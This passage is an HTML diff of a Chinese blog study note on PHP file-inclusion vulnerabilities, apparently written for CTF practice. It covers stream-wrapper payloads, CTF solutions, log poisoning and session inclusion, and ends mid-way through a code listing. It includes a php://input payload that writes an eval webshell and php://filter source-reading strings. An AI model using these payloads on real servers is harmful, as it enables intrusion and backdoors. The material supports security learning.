@@ -1,0 +1,856 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://example.com/2022/05/17/yuque/include/">
+
+
+
+  <title>
+file include - web安全 |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">file include
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-05-17 13:38:45">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-05-17T13:38:45+08:00">2022-05-17</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeyonbf9j20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/yuque/include/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="file-include"><a class="markdownIt-Anchor" href="#file-include">#</a> file include</h1>
+<blockquote>
+<p>来自 pikachu 的介绍：</p>
+<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：<br>
+include(),include_once()<br>
+require(),require_once()<br>
+ 这些文件包含函数，这些函数在代码设计中被经常使用到。</p>
+<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个 “意想不到” 的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>
+**1. 本地文件包含漏洞：** 仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>
+**2. 远程文件包含漏洞：** 能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>
+<p>因此，在 web 应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
+</blockquote>
+<h2 id="php伪协议"><a class="markdownIt-Anchor" href="#php伪协议">#</a> PHP 伪协议</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>文件包含函数 (php):</p>
+<blockquote>
+<p>include</p>
+<p>include_once</p>
+<p>require</p>
+<p>require_one</p>
+<p>nclude 与 require 基本是相同的，除了错误处理方面:</p>
+<ul>
+<li>
+<p>include ()，只生成警告（E_WARNING），并且脚本会继续</p>
+</li>
+<li>
+<p>require ()，会生成致命错误（E_COMPILE_ERROR）并停止脚本</p>
+</li>
+<li>
+<p>include_once () 与 require ()_once ()，如果文件已包含，则不会包含，其他特性如上</p>
+</li>
+</ul>
+</blockquote>
+<p>直接包含 php，html 文件会直接执行，对于 txt 文件或者 linux 下普通文件，可以直接读取</p>
+<p>对于 php 伪协议，使用时需要注意 allow_url_open 和 allow_url_include ，有些伪协议会对此有限制，有些没有</p>
+<h4 id="1file协议"><a class="markdownIt-Anchor" href="#1file协议">#</a> 1.file 协议</h4>
+<p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<p><code>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</code></p>
+<h4 id="2phpfilter"><a class="markdownIt-Anchor" href="#2phpfilter">#</a> 2.php://filter</h4>
+<p>读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>
+<p>allow_url_open=on/off</p>
+<p>allow_url_include=on/off</p>
+<blockquote>
+<p>?file=php://filter/read=convert.base64-encode/resource=web1.php</p>
+<p>?file=php://filter/write=convert.base64-decode/resource=web1.php</p>
+</blockquote>
+<h4 id="3phpinput"><a class="markdownIt-Anchor" href="#3phpinput">#</a> 3.php://input</h4>
+<p>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。http 方法为 get 时并不影响 input 接收 post 参数</p>
+<p>allow_url_open=on/off</p>
+<p>allow_url_include=on</p>
+<p>当然也可以在 post 中写入一句话木马 <code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;');?&gt;</code></p>
+<p>可以配合 file_get_contents 读文件或者 system 执行系统命令，或者写马</p>
+<h4 id="4zipbzip2-zlib"><a class="markdownIt-Anchor" href="#4zipbzip2-zlib">#</a> 4.zip://,bzip2://, zlib://</h4>
+<p>allow_url_open=on/off</p>
+<p>allow_url_include=on/off</p>
+<h5 id="41-zip"><a class="markdownIt-Anchor" href="#41-zip">#</a> 4.1 zip://</h5>
+<p><code>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
+<p><code>?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</code></p>
+<p>如果网站限制，可以将后缀改为 jgp，仍可以解析</p>
+<p>需要将 #进行 url 编码</p>
+<h5 id="42-bzip2"><a class="markdownIt-Anchor" href="#42-bzip2">#</a> 4.2 bzip2://</h5>
+<p><code>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code></p>
+<h5 id="43-zlib"><a class="markdownIt-Anchor" href="#43-zlib">#</a> 4.3 zlib://</h5>
+<p><code>?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></p>
+<h4 id="5data"><a class="markdownIt-Anchor" href="#5data">#</a> 5.data://</h4>
+<p>allow_url_open=on</p>
+<p>allow_url_include=on</p>
+<p><code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code></p>
+<p><code>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p>
+<p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png?x-oss-process=image%2Fresize%2Cw_889%2Climit_0%2Fresize%2Cw_889%2Climit_0" alt="img"></p>
+<h3 id="一些小题目"><a class="markdownIt-Anchor" href="#一些小题目">#</a> 一些小题目</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://filter&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#x27;hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	if ($file!=&quot;http://www.baidu.com&quot;) echo &quot;tips：flag在当前目录的某个文件中&quot;;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#x27;&lt;a href=&quot;?file=http://www.baidu.com&quot;&gt;click go baidu&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//file=php://input  &lt;post&gt; &lt;?php system(&#x27;dir&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a= $_GET[&quot;a&quot;];</span><br><span class="line">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class="line">	echo &quot;success\n&quot;;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//a=php://input    &lt;post&gt; I want flag</span><br><span class="line">//file_get_contents可以读取input流</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if (!$file) echo &#x27;&lt;a href=&quot;?file=upload&quot;&gt;upload?&lt;/a&gt;&#x27;;</span><br><span class="line">if(stristr($file,&quot;input&quot;)||stristr($file, &quot;filter&quot;)||stristr($file,&quot;data&quot;)/*||stristr($file,&quot;phar&quot;)*/)&#123;</span><br><span class="line">	echo &quot;hack?&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><br><span class="line"></span><br><span class="line">//?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="cgi-fast-cgiphp-fpm"><a class="markdownIt-Anchor" href="#cgi-fast-cgiphp-fpm">#</a> CGI、FAST CGI，PHP FPM</h2>
+<p>CGI: 指的是 Web 服务器与 web 应用程序之间的一种数据交换协议。</p>
+<p>FastCGI: 类似于 CGI，Fast-CGI 也是一种通信协议，但是它在 CGI 的基础上，在效率上做了一些优化。只有非静态文件才会被 fastcgi 处理</p>
+<p>PHP-CGI: PHP-CGI 是 PHP 对 Web 服务器提供的 CGI 协议的接口程序，即实现了 CGI 协议的 php 解释器程序。它能解析 PHP，也能通过 CGI 与 web 服务器通信。</p>
+<p>PHP-FPM: 是 PHP 对 Web 服务器提供的 FastCGI 协议的接口程序，即在实现解释 PHP 脚本和与 web 服务器通讯的基础上，额外还提供了相对进程调度、任务管理功能。fastcgi process manager</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105160625653.png" alt="image-20221105160625653"></p>
+<p>Apache/nginx 加载 php：</p>
+<p>1. 通过 so 模块加载</p>
+<p>2. 通过 fpm</p>
+<p>3. 通过 cgi</p>
+<p>最佳方式是 apache/Nginx + fastcgi + php fpm</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105161200210.png" alt="image-20221105161200210" style="zoom:67%;" />
+<p>因此 PHP-fpm 是一个 fastcgi 进程管理器，是对于 fastcgi 协议的具体体现</p>
+<p>web 中间件和 phpfpm 的通信方式有两种</p>
+<p>1.socket</p>
+<p>2.TCP 模式</p>
+<p>fastcgi 协议由多个 recode 组成，recode 由 header 和 body 组成，中间件将这两种封装好发送给后端</p>
+<p>可见，一个 FastCGI record 结构最大支持的 body 大小是 2^16，也就是 65536 字节</p>
+<p>recode 中有 type 字段，type 有七种，第 4 种 type 是给 fmp 传递环境参数时表名数据为 key-value 对</p>
+<p>type=4 时，nginx 会将请求分为 key-value 形式，fpm 收到中间件发来的 key-value，最终执行 key 为 script_name，该 value 为你请求的路径</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164011830.png" alt="image-20221105164011830"></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164219506.png" alt="image-20221105164219506"></p>
+<p>服务器中间件和后端语言（PHP-FPM）通信，第一个数据包就是 type 为 1 的 record，后续互相交流，发送 type 为 4、5、6、7 的 record，结束时发送 type 为 2、3 的 record</p>
+<p>当后端语言（PHP-FPM）拿到由 Nginx 发过来的 FastCGl 数据包后，进行解析，得到上述这些环境变量。然后执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 /var/www/html/index.php</p>
+<p>php-Cgi:</p>
+<p>1) Cgi 协议的实现，用来解释 php 请求；过程: php 请求 -&gt;php-Cgi 读取并解析 php.ini 文件，初始化环境 -&gt; 根据请求参数，返回处理结果</p>
+<p>2）单个进程只能处理一个请求，每一个进程，都需读取 php.ini 进行解析，效率较低</p>
+<p>3）修改完 php.ini 文件，启动 php-Cgi 程序不会生效，无法平滑重启</p>
+<h2 id="日志包含"><a class="markdownIt-Anchor" href="#日志包含">#</a> 日志包含</h2>
+<p>一般日志位置 /var/log/httpd/access.log</p>
+<p><strong>将木马写到日志中，知道日志文件名与路径，存在文件包含漏洞</strong></p>
+<p>首先在 url 中写入自己想要执行的内容，比如 <code>127.0.0.1/inlcude?&lt;?php phpinfo(); ?&gt;</code></p>
+<p>但 url 中会被编码，导致无法包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">219.144.164.44 - - [30/Oct/2022:16:33:08 +0800] &quot;GET /html/html/flag.php HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class="line">219.144.164.44 - - [30/Oct/2022:16:33:19 +0800] &quot;GET /html/html/flag.php?%3C?php%20phpinfo();%20?%3E HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 SLBrowser/7.0.0.12151 SLBChan/23&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以通过抓包，修改为未编码的形式</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030163914509.png" alt="image-20221030163914509"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class="line">219.144.164.44 - - [30/Oct/2022:16:38:47 +0800] &quot;GET /html/html/flag.php?&lt;?php phpinfo(); ?&gt; HTTP/1.1&quot; 200 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在包含日志文件即可</p>
+<p>防止文件包含：文件名包含随机数，定期分割文件，更改日志路径</p>
+<p>如果是 bt 面板搭建的，记得关掉 open_basedir</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165251590.png" alt="image-20221030165251590" style="zoom:80%;" />
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030165348749.png" alt="image-20221030165348749" style="zoom:67%;" />
+<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzYwNTM2NDg=">open_basedir restriction in effect. 原因与解决方法 - 知乎 (zhihu.com)</span></p>
+<h2 id="session包含"><a class="markdownIt-Anchor" href="#session包含">#</a> session 包含</h2>
+<p>前置知识～:cookie 与 session，这个我在 xss 的开头讲过了</p>
+<p>session 目录:/var/llib/php/session</p>
+<p>文件格式:sess_sessid</p>
+<p><strong>知道 session 的路径，可以控制 session 文件中的内容，存在文件包含</strong></p>
+<p><strong>session 常见存储路径：</strong></p>
+<ul>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+<li>session 文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</li>
+</ul>
+<h4 id="一道ctf关于session包含的题目"><a class="markdownIt-Anchor" href="#一道ctf关于session包含的题目">#</a> 一道 CTF 关于 session 包含的题目</h4>
+<p>页面打开之后有 login 和 register 选项，并且点击后 url 长这样:</p>
+<p><code>http://1.1.1.1/index.php?action=login.php</code>   <code>http://1.1.1.1/index.php?action=register.php</code></p>
+<p>很明显，这是通过 include 不同的文件加载不同的页面</p>
+<p>那么就有可能存在文件包含漏洞了</p>
+<p>尝试用 php://filter 读源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$mysqli</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;could not connect to the database:\n&quot;</span> . <span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select password from user where username=?&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$res_password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res_password</span> == <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$username</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invalid user name or password&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mysqli</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;could not connect to the database:\n&quot;</span> . <span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where username=?&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$res_id</span>, <span class="variable">$res_username</span>, <span class="variable">$res_password</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">    <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">num_rows</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">    